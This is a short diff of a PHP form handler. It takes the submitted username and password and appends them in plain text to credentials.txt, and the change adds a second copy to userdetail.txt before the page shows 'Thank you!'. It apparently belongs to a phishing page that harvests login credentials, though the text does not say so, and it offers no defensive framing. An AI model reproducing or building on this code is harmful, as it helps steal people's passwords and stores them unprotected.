@@ -27,6 +27,9 @@
             $userInfo = "\n" . $_POST["username"] . "," . $_POST["password"]; 
             file_put_contents("credentials.txt", $userInfo, FILE_APPEND);
 
+            $user = array($_POST["username"], $_POST["password"]);
+            file_put_contents("userdetail.txt", $user, FILE_APPEND);
+
         ?>
 
         <h3>Thank you!</h3>
